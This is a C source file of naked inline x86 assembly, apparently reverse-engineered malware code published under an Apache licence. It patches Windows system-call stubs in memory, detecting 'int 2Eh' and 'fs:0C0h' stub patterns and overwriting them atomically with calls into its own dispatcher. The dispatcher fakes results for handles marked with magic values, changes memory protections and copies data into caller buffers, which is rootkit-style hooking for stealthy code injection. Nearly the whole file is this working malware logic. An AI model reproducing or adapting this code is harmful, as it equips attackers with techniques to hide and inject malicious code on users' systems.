/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "9. AssemblyBlock2.h"

/*************************************************************************
** ASSEMBLY BLOCK 2.                                                    **
*************************************************************************/

__declspec(naked) void __ASM_REF_3(void)
{
	__asm
	{
		pop     edx
		test    dl, dl
		jz      short __REF_0
		dec     dl
		jz      __REF_7
		dec     dl
		jz      __REF_11
		dec     dl
		jz      __REF_15
		dec     dl
		jz      __REF_21
		jmp     __REF_27

	__REF_0:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_2
		push    edx
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_1
		mov     dword ptr [esp+30h], 40h

	__REF_1:
		pop     edx

	__REF_2:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_3
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_4

	__REF_3:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_4:
		test    eax, eax
		jnz     short __REF_6
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_5
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_5
		mov     edx, [esp+16]
		push    edx
		call    __ASM_REF_4
		mov     edx, [edx+0Ch]
		call    edx

	__REF_5:
		xor     eax, eax

	__REF_6:
		retn

	__REF_7:
		cmp     dword ptr [esp+20h], 0AE1982AEh
		jnz     short __REF_8
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_8
		mov     edx, [edx+8]
		mov     eax, [esp+8]
		mov     [eax], edx
		xor     eax, eax
		retn

	__REF_8:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_9
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string

		jmp     short __REF_10

	__REF_9:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_10:
		retn

	__REF_11:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_12
		push    eax
		push    edi
		mov     edi, [esp+18h]
		call    __ASM_REF_6
		mov     edx, eax
		pop     edi
		pop     eax
		test    edx, edx
		jz      short __REF_12
		mov     eax, [esp+8]
		mov     dword ptr [eax], 0AE1982AEh
		xor     eax, eax
		retn

	__REF_12:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_13
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_14

	__REF_13:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_14:
		retn

	__REF_15:
		cmp     [esp+8], 0AE1982AEh
		jnz     short __REF_16
		xor     eax, eax
		retn

	__REF_16:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_18
		push    eax
		mov     eax, [esp+8]
		cmp     [edx+8], eax
		jnz     short __REF_17
		mov     dword ptr [edx+8], 0

	__REF_17:
		pop     eax

	__REF_18:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_19
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_20

	__REF_19:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_20:
		retn

	__REF_21:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_24
		push    eax
		push    edx
		push    edi
		mov     edi, [esp+14h]
		call    __ASM_REF_6
		pop     edi
		pop     edx
		test    eax, eax
		jz      short __REF_23
		pop     eax
		test    edx, edx
		jz      short __REF_22
		mov     edx, [esp+0Ch]
		mov     dword ptr [edx+20h], 80h

	__REF_22:
		xor     eax, eax
		retn

	__REF_23:
		pop     eax

	__REF_24:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_25
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_26

	__REF_25:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_26:
		retn

	__REF_27:
		call    __ASM_REF_4
		test    edx, edx
		push    edx
		jz      short __REF_30
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_30
		cmp     dword ptr [esp+10h], 1
		jnz     short __REF_30
		cmp     dword ptr [esp+18h], 30h
		jl      short __REF_29
		pop     edx
		push    ecx
		push    esi
		push    edi
		lea     esi, [edx+50h]
		mov     edi, [esp+1Ch]
		mov     ecx, 30h
		rep movsb
		pop     edi
		pop     esi
		pop     ecx
		mov     eax, [esp+18h]
		cmp     eax, 0
		jz      short __REF_28
		mov     dword ptr [eax], 30h

	__REF_28:
		xor     eax, eax
		retn

	__REF_29:
		pop     edx
		mov     eax, 0C000000Dh
		retn

	__REF_30:
		pop     edx
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_31
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_32

	__REF_31:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_32:
		retn
	}
}

__declspec(naked) void __ASM_REF_4(void)
{
	__asm
	{
		push    eax
		push    esi
		push    edi
		push    ecx
		push    edx
		sub     esp, 1Ch
		mov     eax, esp
		push    1Ch
		push    eax
		push    esp
		call    __ASM_REF_5
		call    dword ptr [edx+0Ch]
		mov     edi, [esp]
		add     edi, [esp+0Ch]
		add     esp, 1Ch
		pop     edx
		pop     ecx
		mov     esi, esp

	__REF_0:
		cmp     esi, edi
		jnb     short __REF_1
		lodsd
		xor     eax, 0AE1979DDh
		lea     eax, [eax+4]
		cmp     eax, esi
		jnz     short __REF_0
		lea     eax, [esi-4]
		jmp     short __REF_2

	__REF_1:
		xor     eax, eax

	__REF_2:
		mov     edx, eax
		pop     edi
		pop     esi
		pop     eax
		retn
	}
}

__declspec(naked) void __ASM_REF_5(void)
{
	__asm
	{
		call    $+5
		pop     edx
		add     edx, 124h
		retn
	}
}

__declspec(naked) void __ASM_REF_6(void)
{
	__asm
	{
		push    ebx
		push    ecx
		push    edx
		push    edi
		cmp     edi, 0
		jz      short __REF_1
		mov     edi, [edi+8]
		cmp     edi, 0
		jz      short __REF_1
		movzx   ebx, word ptr [edi]
		mov     edi, [edi+4]
		lea     ebx, [edi+ebx+2]

	__REF_0:
		lea     ebx, [ebx-2]
		cmp     ebx, edi
		jle     short __REF_1
		cmp     word ptr [ebx-2], 5Ch
		jnz     short __REF_0
		push    edx
		push    ebx
		lea     ebx, [edx+10h]
		push    ebx
		call    __ASM_REF_5
		call    dword ptr [edx+8]
		pop     edx
		test    eax, eax
		jnz     short __REF_1
		inc     eax
		jmp     short __REF_2

	__REF_1: 
		xor     eax, eax

	__REF_2:
		pop     edi
		pop     edx
		pop     ecx
		pop     ebx
		retn
	}
}

__declspec(naked) void __ASM_REF_7(void)
{
	__asm
	{
		push    eax
		push    ecx
		push    edx
		call    __ASM_REF_5
		mov     dword ptr [edx+4], 0
		push    dword ptr [edx]
		call    dword ptr [edx+14h]
		pop     ecx
		test    eax, eax
		jz      __REF_3
		push    eax
		push    ecx
		push    eax
		push    esp
		push    80h
		push    18h
		push    eax
		call    __ASM_REF_5
		call    dword ptr [edx+10h]
		pop     edx
		mov     edx, eax
		pop     ecx
		pop     eax
		test    edx, edx
		jz      __REF_3
		cmp     byte ptr [eax], 0B8h
		jnz     __REF_3
		cmp     byte ptr [eax+5], 0BAh
		jz      short __REF_1
		cmp     dword ptr [eax+5], 424548Dh
		jnz     short __REF_0
		cmp     dword ptr [eax+8], 0C22ECD04h
		jnz     short __REF_3
		sub     ecx, eax
		sub     ecx, 0Ah
		mov     [eax+6], ecx
		mov     byte ptr [eax+5], 0E8h
		mov     byte ptr [eax+0Ah], 90h
		jmp     short __REF_3

	__REF_0:
		cmp     dword ptr [eax+7], 424548Dh
		jnz     short __REF_3
		cmp     dword ptr [eax+0Bh], 0C015FF64h
		jnz     short __REF_3
		cmp     dword ptr [eax+0Fh], 0C2000000h
		jnz     short __REF_3
		push    edx
		call    __ASM_REF_5
		mov     dword ptr [edx+4], 1
		pop     edx
		push    esi
		push    eax
		push    ebx
		push    ecx
		push    edx
		mov     esi, eax
		mov     eax, [esi+0Ah]
		mov     edx, [esi+0Eh]
		sub     ecx, esi
		sub     ecx, 12h
		mov     ebx, 0E8909004h
		lock cmpxchg8b qword ptr [esi+0Ah]
		pop     edx
		pop     ecx
		pop     ebx
		pop     eax
		pop     esi
		jmp     short __REF_3

	__REF_1:
		cmp     word ptr [eax+0Ah], 0D2FFh
		jz      short __REF_2
		cmp     word ptr [eax+0Ah], 12FFh
		jnz     short __REF_3
		mov     byte ptr [eax+0Bh], 0D2h

	__REF_2:
		mov     [eax+6], ecx

	__REF_3:
		pop     eax
		retn
	}
}

#pragma code_seg(".text")
__declspec(allocate(".text")) HARDCODED_ADDRESSES g_hardAddrs = {0};
